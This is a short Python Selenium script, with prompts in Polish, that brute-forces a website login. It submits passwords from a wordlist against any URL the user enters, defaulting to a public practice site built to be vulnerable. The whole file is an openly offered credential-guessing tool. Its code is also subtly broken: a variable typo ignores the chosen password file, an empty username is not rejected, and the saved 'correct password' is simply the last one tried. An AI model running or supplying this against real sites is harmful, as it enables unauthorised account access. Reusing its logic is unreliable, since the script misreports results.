from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC

site = input("Podaj adres strony:")
if site == "test":
   site = "http://testphp.vulnweb.com/login.php"
else:
    site = site

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.get(site)

"""Obłsuga listy hasłę"""


def read_list_from_file(filename):
    file_handler = open(filename + ".txt", "r")
    read_list = file_handler.readlines()
    file_handler.close()
    return read_list


username = input("Podaj nazwę użytkownik:")  #test
if username != "":
    pass
else:
    print("Nazwa użytkownika nie może być pusta:")

passfile = input("Podaj nazwę pliku haseł :") #passw
if passfile == "":
    passfile ="pass_list"
else:
    passfiele = passfile


"""Osługa strony"""
cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
paswords = read_list_from_file(passfile)

username_driver = input("Podaj nazwę elmentu z nazwą użytkownika: ")
if username_driver == "":
    username_driver = "uname"
else:
    username_driver = username_driver

password_driver = input("Podaj nazwę elmentu z hasłem: ")
if password_driver == "":
    password_driver = "pass"
else:
    password_driver = password_driver


for password in paswords:
    driver.find_element(by=By.NAME, value=username_driver).send_keys(username)
    driver.find_element(by=By.NAME, value=password_driver).send_keys(password)
    driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
    try:  # obsługa błedów
        WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
    except:
        print("Correct password is ==> " + password + " <==")

file_write = open("ok_password.txt", "w")
file_write.write("Correct password is ==> " + password + " <==")

driver.close()
